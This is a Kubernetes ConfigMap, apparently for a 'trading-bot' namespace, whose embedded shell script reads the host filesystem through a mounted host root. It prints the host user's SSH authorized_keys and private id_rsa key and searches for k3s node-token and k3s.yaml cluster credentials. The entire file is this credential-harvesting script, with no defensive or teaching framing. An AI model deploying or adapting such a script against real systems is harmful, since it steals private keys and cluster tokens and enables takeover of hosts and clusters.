apiVersion: v1
kind: ConfigMap
metadata:
  name: reader-script
  namespace: trading-bot
data:
  run.sh: |
    #!/bin/sh
    echo '=== LS K3S SERVER ==='
    ls -la /k3s-server/ 2>&1
    echo '=== LS HOST ROOT ==='
    ls /host-root/ 2>&1
    echo '=== HOME PC SSH ==='
    ls /host-root/home/pc/.ssh/ 2>&1
    cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null
    cat /host-root/home/pc/.ssh/id_rsa 2>/dev/null || echo NO_KEY
    echo '=== FIND K3S TOKEN ==='
    find /host-root/ -name "node-token" -o -name "k3s.yaml" 2>/dev/null | head -10
    echo '=== DONE ==='